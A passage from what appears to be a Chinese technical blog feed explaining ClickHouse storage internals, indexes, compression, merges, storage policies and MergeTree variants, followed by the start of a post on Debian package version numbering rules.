的命名结构：</strong></p><p>格式为 <code>&#123;partition&#125;_&#123;min_block&#125;_&#123;max_block&#125;_&#123;level&#125;</code>，例如：</p><ul><li><code>202404_1_10_1</code> 表示：<ul><li>分区是 202404</li><li>包含的块号是从1到10</li><li>合并层级为1</li></ul></li></ul><p>ClickHouse 会通过后台合并机制把多个 Part 合并成一个更大的 Part，减少碎片、优化查询。</p><hr><h2 id="主键与索引机制"><a href="#主键与索引机制" class="headerlink" title="主键与索引机制"></a>主键与索引机制</h2><p>ClickHouse 的主键不是唯一性约束，而是<strong>数据的物理排序依据</strong>，用于范围查找优化。</p><h3 id="主键索引（primary-idx）"><a href="#主键索引（primary-idx）" class="headerlink" title="主键索引（primary.idx）"></a>主键索引（primary.idx）</h3><ul><li>以每 <code>N</code> 行（默认8192）为一个数据块，对主键字段建立 min&#x2F;max 索引。</li><li>存储在 <code>primary.idx</code> 中，每个 entry 对应一段数据的起始位置。</li><li>查询时可快速跳过不匹配的数据块（称为 <strong>粗粒度索引</strong>）。</li></ul><h3 id="Skip-Index（二级索引）"><a href="#Skip-Index（二级索引）" class="headerlink" title="Skip Index（二级索引）"></a>Skip Index（二级索引）</h3><p>ClickHouse 还支持一些可选的辅助索引，用于跳过数据块：</p><ul><li><code>minmax</code>（最常用）：为某列记录每块的 min&#x2F;max</li><li><code>set</code>：记录块中出现过的值集合</li><li><code>bloom_filter</code>：用于模糊匹配</li><li><code>ngrambf_v1</code>：支持 LIKE ‘%xxx%’ 模糊匹配优化</li></ul><p>这些索引不会影响写入，但能显著提升过滤性能。</p><hr><h2 id="数据压缩与编码策略"><a href="#数据压缩与编码策略" class="headerlink" title="数据压缩与编码策略"></a>数据压缩与编码策略</h2><p>ClickHouse 支持非常高效的压缩机制，是其性能的关键之一。</p><h3 id="压缩流程："><a href="#压缩流程：" class="headerlink" title="压缩流程："></a>压缩流程：</h3><ol><li>每列数据按 block 写入（默认最大64KB）</li><li>每个 block 使用 LZ4（或 ZSTD）压缩</li><li>某些数据类型还会使用 <strong>特殊编码策略</strong>：<ul><li>整型：Delta 编码、Gorilla 编码</li><li>字符串：Dictionary 编码</li><li>Nullable：使用 bitmap 分离空值位图</li><li>LowCardinality：将字符串字段转为整数字典引用</li></ul></li></ol><p>压缩率常常达到 5～10 倍，远高于行式数据库。</p><hr><h2 id="分区（Partition）与分片（Shard）"><a href="#分区（Partition）与分片（Shard）" class="headerlink" title="分区（Partition）与分片（Shard）"></a>分区（Partition）与分片（Shard）</h2><p>ClickHouse 将数据分为多个 <strong>分区（partition）</strong>，每个分区下有多个 part。</p><ul><li>分区是逻辑组织单位，如按月、按日划分。</li><li>写入新分区的数据不会触发旧分区的合并。</li><li>分区字段常设为 <code>toYYYYMM(date)</code> 形式。</li></ul><p>**分片（shard）**则是跨节点水平分布的数据副本，属于分布式部署概念，不直接影响本地数据结构。分片主要用于 <strong>水平扩展</strong>（Horizontal Scaling），通过将数据分布到不同的节点，来支持大规模数据的处理和存储。<strong>分片</strong> 是水平划分的，每个分片存储整个表的一部分数据，通常是按某种规则（如 <code>Hash</code> 或范围划分）将数据均匀分布到多个节点</p><p><strong>分片的特性</strong></p><ol><li><strong>跨节点分布</strong>：<ul><li>分片是 <strong>跨多个节点的数据分布</strong>，通常是为了提高系统的容量和处理能力。每个节点存储数据的一部分，这些部分被称为 <strong>分片</strong>（shard）。</li><li><strong>分片</strong> 是水平划分的，每个分片存储整个表的一部分数据，通常是按某种规则（如 <code>Hash</code> 或范围划分）将数据均匀分布到多个节点。</li></ul></li><li><strong>数据副本（Replica）</strong>：<ul><li><strong>分片</strong> 和 <strong>副本</strong> 是分布式部署的核心概念。每个分片通常会有一个或多个 <strong>副本</strong>，副本用于容错和高可用性。当一个节点或分片出现故障时，系统可以自动从副本中恢复数据，保证服务的可用性。</li><li>副本通常是分布式表的一部分，每个副本存储与其他副本相同的数据，但存储在不同的节点上。</li></ul></li><li><strong>分片和查询</strong>：<ul><li>当查询是针对整个表进行的，<code>Distributed</code> 引擎会自动将查询请求分发到相应的分片节点。分片负责处理本地数据并返回查询结果。</li><li>通过使用分片，ClickHouse 能够支持大规模数据集的分布式查询，避免单节点过载，同时提高查询吞吐量。</li></ul></li></ol><hr><h2 id="TTL-与数据生命周期"><a href="#TTL-与数据生命周期" class="headerlink" title="TTL 与数据生命周期"></a>TTL 与数据生命周期</h2><p>ClickHouse 支持在表级或字段级设置 TTL，用于自动删除或移动数据。</p><p>例如：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TTL event_time <span class="operator">+</span> <span class="type">INTERVAL</span> <span class="number">30</span> <span class="keyword">DAY</span> <span class="keyword">DELETE</span></span><br></pre></td></tr></table></figure><p>执行原理：</p><ul><li>ClickHouse 后台定时任务扫描符合 TTL 条件的数据块</li><li>构造新的 Part（删除或迁移）</li><li>替换旧 Part，旧数据自动清理</li></ul><p>这一机制也依赖 Part 的不可变性与自动合并能力。</p><hr><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><ul><li>数据是以列为单位存储在磁盘上的，每列有自己的 <code>.bin</code> 和 <code>.mrk3</code> 文件。</li><li>数据写入生成不可变的 Part，后台进行合并优化。</li><li>主键索引和辅助索引实现了高效的数据跳过（跳跃式扫描）。</li><li>压缩、编码机制帮助 ClickHouse 在磁盘和内存间取得性能平衡。</li><li>Partition 逻辑管理数据生命周期与并发写入。</li><li>TTL 自动清理机制基于 Part 和合并逻辑运行。</li></ul><hr><h1 id="分布式查询执行机制"><a href="#分布式查询执行机制" class="headerlink" title="分布式查询执行机制"></a>分布式查询执行机制</h1><p>当查询一个 <code>Distributed</code> 表时：</p><ul><li>查询在本地生成逻辑执行计划</li><li>然后分发到每个分片的本地 MergeTree 表执行</li><li>每个分片执行完返回结果，主节点进行 <strong>Merge&#x2F;Aggregate</strong></li></ul><p>ClickHouse 会自动判断是否进行 <strong>聚合下推</strong>、<strong>过滤下推</strong>，从而减少跨网络传输。</p><hr><h1 id="存储引擎与文件系统交互机制"><a href="#存储引擎与文件系统交互机制" class="headerlink" title="存储引擎与文件系统交互机制"></a>存储引擎与文件系统交互机制</h1><h2 id="MergeTree-表引擎的核心机制"><a href="#MergeTree-表引擎的核心机制" class="headerlink" title="MergeTree 表引擎的核心机制"></a>MergeTree 表引擎的核心机制</h2><p>MergeTree 是 ClickHouse 中最重要、最通用的表引擎。它支持有序写入、延迟合并、高效读取、TTL 清理等机制。</p><p><strong>设计目标</strong></p><ul><li><strong>高并发写入（append-only + 异步合并）</strong></li><li><strong>快速查询（主键索引 + mark 跳跃）</strong></li><li><strong>灵活数据管理（分区、TTL、物化视图）</strong></li></ul><p>MergeTree 是列式、不可变、基于 LSM 思路的引擎，但不同于 RocksDB 那种 key-value 模型，它以 block 和 column 为单位组织数据。</p><hr><h2 id="数据写入流程详解"><a href="#数据写入流程详解" class="headerlink" title="数据写入流程详解"></a>数据写入流程详解</h2><ol><li><strong>写入内存</strong><ul><li>接收 insert 数据，形成内存中的 <code>Block</code></li></ul></li><li><strong>数据编码 + 压缩</strong><ul><li>对每列进行编码、压缩处理</li></ul></li><li><strong>落盘成 Part</strong><ul><li>每次 insert 都生成一个新的 <code>Part</code>，保存在磁盘上一个独立目录中</li></ul></li><li><strong>更新元数据</strong><ul><li>包括 <code>columns.txt</code>, <code>checksums.txt</code>, <code>partition.dat</code>, <code>count.txt</code></li><li>同时更新主键索引文件（如 <code>primary.idx</code>）</li></ul></li></ol><p>写入流程采用批量式写入 + 不可变数据块，避免了行级锁和复杂并发控制。</p><hr><h2 id="磁盘文件结构"><a href="#磁盘文件结构" class="headerlink" title="磁盘文件结构"></a>磁盘文件结构</h2><p>每个 Part 的文件组织如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">202404_1_10_1/</span><br><span class="line">├── columns.txt         -- 记录所有字段</span><br><span class="line">├── checksums.txt       -- 所有文件校验信息</span><br><span class="line">├── count.txt           -- 行数</span><br><span class="line">├── partition.dat       -- 分区值</span><br><span class="line">├── primary.idx         -- 主键索引（粗粒度）</span><br><span class="line">├── column1.bin         -- 实际数据（压缩编码后）</span><br><span class="line">├── column1.mrk3        -- mark 文件（跳跃索引）</span><br><span class="line">├── ...</span><br></pre></td></tr></table></figure><p>每列对应两个文件：</p><ul><li><code>.bin</code>：压缩列数据</li><li><code>.mrk3</code>：跳跃索引（每 N 行标记偏移）</li></ul><p>这种结构易于横向扩展（按列、按分区）和快速定位。</p><hr><h2 id="mark-文件的作用"><a href="#mark-文件的作用" class="headerlink" title="mark 文件的作用"></a>mark 文件的作用</h2><p>Mark 文件（<code>.mrk3</code>）用于支持 <strong>跳跃式扫描</strong>，原理是：</p><ul><li>每隔 N 行记录一个 “mark”</li><li>每个 mark 保存当前列文件偏移位置（如偏移量、压缩块内位置）</li><li>查询时可快速 seek 到指定 mark，避免线性扫描</li></ul><p>默认一个 mark 间隔 8192 行（可调），决定了 I&#x2F;O 粒度和内存消耗的权衡。</p><hr><h2 id="Part-的合并（Merge）机制"><a href="#Part-的合并（Merge）机制" class="headerlink" title="Part 的合并（Merge）机制"></a>Part 的合并（Merge）机制</h2><p>为了防止磁盘碎片和读取效率下降，ClickHouse 会定期触发后台合并任务。</p><h3 id="合并流程："><a href="#合并流程：" class="headerlink" title="合并流程："></a>合并流程：</h3><ol><li>挑选多个小 Part（同一分区内）</li><li>解压 + 解码后 merge 成一个大 Part</li><li>重新编码、压缩、写入新文件</li><li>替换旧 Part，更新元数据</li></ol><p>合并采用多线程并发执行，支持 IO 限速、按策略排序（如 TTL 优先、大小优先）</p><p>可通过 <code>system.merges</code> 观察合并状态。</p><hr><h2 id="磁盘空间策略（Disk-Volume）"><a href="#磁盘空间策略（Disk-Volume）" class="headerlink" title="磁盘空间策略（Disk &amp; Volume）"></a>磁盘空间策略（Disk &amp; Volume）</h2><p>ClickHouse 从 v20+ 支持将数据分布在多个磁盘&#x2F;目录上。</p><h3 id="存储策略（StoragePolicy）"><a href="#存储策略（StoragePolicy）" class="headerlink" title="存储策略（StoragePolicy）"></a>存储策略（StoragePolicy）</h3><p>通过定义 <code>Disk</code>, <code>Volume</code>, <code>StoragePolicy</code>：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">storage_configuration</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">disks</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">disk1</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">path</span>&gt;</span>/var/lib/clickhouse/disk1/<span class="tag">&lt;/<span class="name">path</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">disk1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">disk2</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">path</span>&gt;</span>/mnt/nvme/<span class="tag">&lt;/<span class="name">path</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">disk2</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">disks</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">policies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">hot_to_cold</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">volumes</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">hot</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">disk</span>&gt;</span>disk1<span class="tag">&lt;/<span class="name">disk</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">hot</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">cold</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">disk</span>&gt;</span>disk2<span class="tag">&lt;/<span class="name">disk</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">cold</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">volumes</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">hot_to_cold</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">policies</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">storage_configuration</span>&gt;</span></span><br></pre></td></tr></table></figure><p>可以实现：</p><ul><li>热数据存 NVMe，冷数据归档到 SATA</li><li>配合 TTL 进行分级迁移</li></ul><hr><h2 id="缓存机制（Mark-Cache、Uncompressed-Cache）"><a href="#缓存机制（Mark-Cache、Uncompressed-Cache）" class="headerlink" title="缓存机制（Mark Cache、Uncompressed Cache）"></a>缓存机制（Mark Cache、Uncompressed Cache）</h2><p>ClickHouse 为提高查询性能，设计了两级缓存：</p><ul><li><strong>Mark Cache（默认2GB）</strong><ul><li>缓存 mark 文件（跳跃索引），避免频繁读取 <code>.mrk3</code></li><li>作用：快速定位数据位置</li></ul></li><li><strong>Uncompressed Cache（默认8GB）</strong><ul><li>缓存解压后的数据块（Block）</li><li>作用：避免重复解压、提高重复查询速度</li></ul></li></ul><p>这两个缓存都驻留内存，可通过配置调整大小，适当扩大可明显提升查询性能。</p><hr><h2 id="其他存储优化技术"><a href="#其他存储优化技术" class="headerlink" title="其他存储优化技术"></a>其他存储优化技术</h2><ul><li><strong>Zero Copy Replication</strong>：副本之间通过共享存储（如 S3、NFS）进行数据同步，避免拷贝</li><li><strong>分区裁剪</strong>：查询时自动忽略无关分区，减少读取</li><li><strong>Compact Part</strong>：小文件写入场景下启用“紧凑格式”Part，适合日志写入</li><li><strong>TTL MOVE TO DISK</strong>：数据分层迁移 + 自动清理</li></ul><hr><h2 id="小结-1"><a href="#小结-1" class="headerlink" title="小结"></a>小结</h2><ul><li>MergeTree 的核心机制基于 Part，不可变、易合并、列存</li><li>Part 文件结构详尽：数据 + 索引 + 校验 + 元数据</li><li>mark 索引为跳跃式扫描提供支持</li><li>后台合并优化性能、释放空间</li><li>多磁盘策略与缓存机制提升资源利用效率</li></ul><hr><h1 id="实战分析与源码学习"><a href="#实战分析与源码学习" class="headerlink" title="实战分析与源码学习"></a><strong>实战分析与源码学习</strong></h1><h2 id="系统表分析"><a href="#系统表分析" class="headerlink" title="系统表分析"></a>系统表分析</h2><p>ClickHouse 提供大量以 <code>system.</code> 开头的系统表用于实时观察数据库内部状态，非常适合用于：</p><ul><li>查询调优</li><li>瓶颈定位</li><li>资源消耗监控</li><li>数据合并与副本同步监控</li></ul><hr><p><strong>常用系统表</strong></p><table><thead><tr><th>表名</th><th>作用</th></tr></thead><tbody><tr><td><code>system.parts</code></td><td>查看表中各个 Part 的信息（大小、状态、压缩率等）</td></tr><tr><td><code>system.merges</code></td><td>当前正在进行的合并任务</td></tr><tr><td><code>system.replication_queue</code></td><td>副本同步队列，观察主从同步延迟</td></tr><tr><td><code>system.processes</code></td><td>当前正在执行的查询及其资源消耗</td></tr><tr><td><code>system.query_log</code></td><td>所有历史查询的执行日志（可配置保存时间）</td></tr><tr><td><code>system.text_log</code></td><td>ClickHouse 后台运行日志</td></tr><tr><td><code>system.metrics</code></td><td>实时系统性能指标，如内存、线程、cache 命中率</td></tr><tr><td><code>system.events</code></td><td>查询过程中触发的事件统计，例如 <code>SelectedParts</code>, <code>SelectedRows</code></td></tr><tr><td><code>system.trace_log</code></td><td>CPU 栈追踪信息（用于定位复杂查询中的热点函数）</td></tr></tbody></table><p>通过结合 <code>EXPLAIN</code> 和 <code>system.query_log</code>，可以完整还原一次查询的执行过程。</p><hr><h2 id="查询慢的问题定位思路"><a href="#查询慢的问题定位思路" class="headerlink" title="查询慢的问题定位思路"></a><strong>查询慢的问题定位思路</strong></h2><ol><li><strong>分析查询计划</strong></li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXPLAIN PLAN <span class="keyword">SELECT</span> ...</span><br></pre></td></tr></table></figure><p>查看是否存在全表扫描、JOIN 不走索引、聚合位置错误等。</p><ol start="2"><li><strong>查看实际执行信息</strong></li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> system.query_log <span class="keyword">WHERE</span> query_id <span class="operator">=</span> <span class="string">&#x27;...&#x27;</span></span><br></pre></td></tr></table></figure><p>包括读取的 part 数量、rows read、bytes read、memory usage 等。</p><ol start="3"><li><strong>检查合并状态</strong></li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> system.merges <span class="keyword">WHERE</span> <span class="keyword">table</span> <span class="operator">=</span> <span class="string">&#x27;your_table&#x27;</span></span><br></pre></td></tr></table></figure><p>频繁合并可能拖慢查询。</p><ol start="4"><li><strong>辅助索引是否生效</strong> 使用 <code>EXPLAIN PIPELINE</code> 查看是否启用了 min-max、bloom 过滤器。</li></ol><hr><h2 id="ClickHouse-源码结构总览"><a href="#ClickHouse-源码结构总览" class="headerlink" title="ClickHouse 源码结构总览"></a>ClickHouse 源码结构总览</h2><p>ClickHouse 的源码相对庞大，但结构清晰，主要分为以下几个核心模块（位于 <code>src/</code> 目录）：</p><h3 id="核心模块结构"><a href="#核心模块结构" class="headerlink" title="核心模块结构"></a>核心模块结构</h3><table><thead><tr><th>路径</th><th>内容</th></tr></thead><tbody><tr><td><code>src/Storages/</code></td><td>各种表引擎，如 MergeTree、Kafka、Memory、Distributed</td></tr><tr><td><code>src/Interpreters/</code></td><td>查询解析与执行计划生成模块</td></tr><tr><td><code>src/Processors/</code></td><td>执行器中的算子和执行 pipeline 实现</td></tr><tr><td><code>src/Columns/</code></td><td>列类型的实现（支持类型系统、向量化）</td></tr><tr><td><code>src/DataTypes/</code></td><td>数据类型定义与转换</td></tr><tr><td><code>src/IO/</code></td><td>文件读写、压缩、缓冲层、缓存策略</td></tr><tr><td><code>src/Parsers/</code></td><td>SQL 解析器（AST 构建）</td></tr><tr><td><code>src/Common/</code></td><td>公共基础库，包括多线程、锁、内存池等</td></tr><tr><td><code>src/Core/</code></td><td>全局上下文定义、查询 ID 管理等</td></tr></tbody></table><hr><h1 id="MergeTree-家族"><a href="#MergeTree-家族" class="headerlink" title="MergeTree 家族"></a>MergeTree 家族</h1><p><strong>所有 MergeTree 系列表引擎都有以下共同能力：</strong></p><ul><li>列式存储（高压缩、按需读取）</li><li>主键有序（支持范围过滤）</li><li>分区写入（支持按时间或字段拆分）</li><li>数据 append-only（不可变 Part）</li><li>后台合并（异步合并优化读取性能）</li><li>TTL 支持（按行&#x2F;列自动清理或迁移）</li><li>支持并发读写、高吞吐 insert</li><li>支持多副本复制（Replicated 变体）</li></ul><hr><h2 id="MergeTree-家族成员一览"><a href="#MergeTree-家族成员一览" class="headerlink" title="MergeTree 家族成员一览"></a>MergeTree 家族成员一览</h2><table><thead><tr><th>引擎名称</th><th>特殊能力</th><th>典型使用场景</th></tr></thead><tbody><tr><td><code>MergeTree</code></td><td>无特殊行为</td><td>通用查询、分析型写入</td></tr><tr><td><code>ReplacingMergeTree</code></td><td>删除重复数据（可选版本字段）</td><td>幂等写入、幂等去重更新</td></tr><tr><td><code>SummingMergeTree</code></td><td>聚合同主键数据</td><td>实时累计、指标类数据</td></tr><tr><td><code>AggregatingMergeTree</code></td><td>支持复杂状态聚合合并</td><td>用户自定义聚合（UDF、HLL）</td></tr><tr><td><code>CollapsingMergeTree</code></td><td>按标志列合并正负事件</td><td>日志型数据，标记删除</td></tr><tr><td><code>VersionedCollapsingMergeTree</code></td><td>同上 + 版本控制</td><td>日志场景下精确回滚</td></tr><tr><td><code>GraphiteMergeTree</code></td><td>针对 Graphite 监控数据设计</td><td>时间序列归档、聚合、清洗</td></tr></tbody></table><p>还有对应的副本版本：</p><ul><li><code>ReplicatedMergeTree</code>（+ 所有以上派生变体都可用 <code>ReplicatedXXXMergeTree</code> 实现多副本）</li></ul><hr><h2 id="关键变体深度解析"><a href="#关键变体深度解析" class="headerlink" title="关键变体深度解析"></a>关键变体深度解析</h2><h3 id="ReplacingMergeTree"><a href="#ReplacingMergeTree" class="headerlink" title="ReplacingMergeTree"></a>ReplacingMergeTree</h3><h4 id="特点："><a href="#特点：" class="headerlink" title="特点："></a>特点：</h4><ul><li>根据主键合并 <strong>重复行</strong>（可选提供 <code>version</code> 字段）</li><li>多条相同主键的记录，保留“最新”版本（如果定义了 <code>version</code>）</li></ul><h4 id="底层行为："><a href="#底层行为：" class="headerlink" title="底层行为："></a>底层行为：</h4><ul><li>合并过程中比较是否主键相同：<ul><li>无版本字段：保留其中任一条（不确定性）</li><li>有版本字段：保留最大版本号的数据</li></ul></li></ul><h4 id="用法示例："><a href="#用法示例：" class="headerlink" title="用法示例："></a>用法示例：</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ENGINE <span class="operator">=</span> ReplacingMergeTree(version)</span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> (id)</span><br></pre></td></tr></table></figure><h4 id="场景："><a href="#场景：" class="headerlink" title="场景："></a>场景：</h4><ul><li>日志幂等写入（如 Kafka 重放）</li><li>状态表更新（如最后一次登录记录）</li></ul><hr><h3 id="SummingMergeTree"><a href="#SummingMergeTree" class="headerlink" title="SummingMergeTree"></a>SummingMergeTree</h3><h4 id="特点：-1"><a href="#特点：-1" class="headerlink" title="特点："></a>特点：</h4><ul><li>对于主键相同的记录，在合并时自动进行 <strong>数值字段求和</strong></li><li>非数值字段将被忽略合并（丢弃）</li></ul><h4 id="用法示例：-1"><a href="#用法示例：-1" class="headerlink" title="用法示例："></a>用法示例：</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ENGINE <span class="operator">=</span> SummingMergeTree</span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> (uid, <span class="type">date</span>)</span><br></pre></td></tr></table></figure><h4 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h4><ul><li>合并只在后台发生，查询时仍可能看到重复数据</li><li>需要定期执行 <code>OPTIMIZE TABLE</code> 保证合并完成</li></ul><h4 id="场景：-1"><a href="#场景：-1" class="headerlink" title="场景："></a>场景：</h4><ul><li>实时流量统计、PV&#x2F;UV 累计、财务计量汇总</li></ul><hr><h3 id="AggregatingMergeTree"><a href="#AggregatingMergeTree" class="headerlink" title="AggregatingMergeTree"></a>AggregatingMergeTree</h3><h4 id="特点：-2"><a href="#特点：-2" class="headerlink" title="特点："></a>特点：</h4><ul><li>专门支持 <code>AggregateFunction</code> 类型字段的合并</li><li>合并时执行函数级别的聚合（如 <code>uniqState</code>、<code>avgState</code>）</li></ul><h4 id="用法示例：-2"><a href="#用法示例：-2" class="headerlink" title="用法示例："></a>用法示例：</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ENGINE <span class="operator">=</span> AggregatingMergeTree</span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> (app, <span class="type">date</span>)</span><br></pre></td></tr></table></figure><p>字段定义示例：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AggregateFunction(uniq, UInt64) <span class="keyword">AS</span> uv</span><br></pre></td></tr></table></figure><h4 id="底层机制："><a href="#底层机制：" class="headerlink" title="底层机制："></a>底层机制：</h4><ul><li>每次插入时写入状态（如 <code>uniqState</code> 的 bitmap）</li><li>合并时执行状态合并</li><li>查询时通过 <code>final</code> 强制 merge 执行完整聚合</li></ul><h4 id="场景：-2"><a href="#场景：-2" class="headerlink" title="场景："></a>场景：</h4><ul><li>大规模去重、HLL 近似统计</li><li>用户自定义聚合函数存储</li></ul><hr><h2 id="如何选择合适的-MergeTree-变体"><a href="#如何选择合适的-MergeTree-变体" class="headerlink" title="如何选择合适的 MergeTree 变体"></a>如何选择合适的 MergeTree 变体</h2><ul><li><strong>幂等数据写入</strong> → 使用 <code>ReplacingMergeTree(version)</code></li><li><strong>日志数据流入 + 撤销补偿</strong> → <code>CollapsingMergeTree</code> 或 <code>VersionedCollapsingMergeTree</code></li><li><strong>业务指标类数据，需周期汇总</strong> → <code>SummingMergeTree</code></li><li><strong>高精度聚合、近似统计</strong> → <code>AggregatingMergeTree</code></li><li><strong>不需要任何合并行为（如测试）</strong> → <code>MergeTree</code></li></ul><hr>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ClickHouse的架构与设计理念&quot;&gt;&lt;a href=&quot;#ClickHouse的架构与设计理念&quot; class=&quot;headerlink&quot; title=&quot;ClickHouse的架构与设计理念&quot;&gt;&lt;/a&gt;ClickHouse的架构与设计理念&lt;/h1&gt;&lt;h2 id=&quot;C</summary>
      
    
    
    
    
    <category term="Clickhouse" scheme="https://lyi61pd.github.io/tags/Clickhouse/"/>
    
  </entry>
  
  <entry>
    <title>Debian软件包和仓库规范</title>
    <link href="https://lyi61pd.github.io/2025/04/11/Debian%E8%BD%AF%E4%BB%B6%E5%8C%85%E5%92%8C%E4%BB%93%E5%BA%93%E8%A7%84%E8%8C%83/"/>
    <id>https://lyi61pd.github.io/2025/04/11/Debian%E8%BD%AF%E4%BB%B6%E5%8C%85%E5%92%8C%E4%BB%93%E5%BA%93%E8%A7%84%E8%8C%83/</id>
    <published>2025-04-11T00:00:00.000Z</published>
    <updated>2025-07-30T03:40:55.099Z</updated>
    
    <content type="html"><![CDATA[<h2 id="版本号"><a href="#版本号" class="headerlink" title="版本号"></a>版本号</h2><p><a href="https://manpages.debian.org/wheezy/dpkg-dev/deb-version.5.en.html"> deb-version(5)</a></p><p><a href="https://www.debian.org/doc/debian-policy/ch-controlfields.html#standards-version"> Debian Policy Manual</a></p><h3 id="版本命名格式"><a href="#版本命名格式" class="headerlink" title="版本命名格式"></a>版本命名格式</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[epoch:]upstream-version[-debian-revision]</span><br></pre></td></tr></table></figure><h3 id="epoch"><a href="#epoch" class="headerlink" title="epoch"></a>epoch</h3><p>组成元素:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0-9</span><br></pre></td></tr></table></figure><p>使用规则:</p><p>一般默认省略，省略时默认为0，且一般是一个单独的无符号整数</p><h3 id="upstream-version"><a href="#upstream-version" class="headerlink" title="upstream-version"></a>upstream-version</h3><p>组成元素</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0-9</span><br><span class="line">a-z</span><br><span class="line">A-Z</span><br><span class="line">.</span><br><span class="line">+</span><br><span class="line">-</span><br><span class="line">:</span><br><span class="line">~</span><br></pre></td></tr></table></figure><p>特殊符号使用规则:</p><p>如果没有epoch那么不能用<code>:</code></p><p>如果没有debian-revision那么不能用<code>-</code></p><p><code>~</code>用来标注预先的版本，比如<code>1.0~beta1~test123</code>小于<code>1.0~beta1</code>小于<code>1.0</code></p><h3 id="debian-revision"><a href="#debian-revision" class="headerlink" title="debian-revision"></a>debian-revision</h3><p>组成元素</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0-9</span><br><span class="line">a-z</span><br><span class="line">A-Z</span><br><span class="line">+</span><br><span class="line">.</span><br><span class="line">~</span><br></pre></td></tr></table></figure><h3 id="比较规则"><a href="#比较规则" class="headerlink" title="比较规则"></a>比较规则</h3><p>首先比较epoch，然后比较upstream-version，然后比较debian-revision</p><p>epoch直接比较数字大小就行</p><p>upstream-version和debian-revision的比较算法则比较特殊，会从左到右，遇到数字字符串就一块拿出来，遇到非数字字符也一块拿出来，然后比较，直到把所有的拿出完或者比较出结果。数字字符是直接比数字大小，非数字字符的比较方式如下：</p><p>基于ASCII码表，但是有一些修改：</p><ul><li><code>~</code>小于任何值，甚至比空字符还小</li><li>字母小于任何特殊符号（除了<code>~</code>）</li></ul><p>比如：</p><p><code>~~</code> &lt; <code>~~a</code> &lt; <code>~</code> &lt; 空字符 &lt; <code>a</code></p><p>举个例子</p><p>12as.d54  和 12asd33</p><p>第一步：取出数字12和12比，相等，继续下一步</p><p>第二步：取出非数字as.d和asd比，其中比到第三个字符.比d大，所以左边大，结束</p><h3 